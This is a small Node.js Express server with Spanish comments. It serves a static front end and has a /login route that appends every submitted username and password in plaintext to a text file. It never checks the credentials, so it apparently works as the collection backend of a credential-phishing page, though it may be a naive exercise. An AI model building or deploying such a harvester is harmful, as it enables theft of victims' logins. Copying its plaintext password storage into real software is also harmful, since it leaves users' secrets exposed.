const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Servir archivos estáticos desde /public
app.use(express.static(path.join(__dirname, 'public')));

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Ruta POST para recibir datos
app.post('/login', (req, res) => {
  const { usuario, password } = req.body;
  const log = `Usuario: ${usuario}, Contraseña: ${password}\n`;

  fs.appendFile('datos_login.txt', log, (err) => {
    if (err) {
      console.error('Error al guardar datos:', err);
      return res.status(500).send('Error del servidor');
    }
    console.log('Datos guardados');
    res.send('Datos recibidos');
  });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
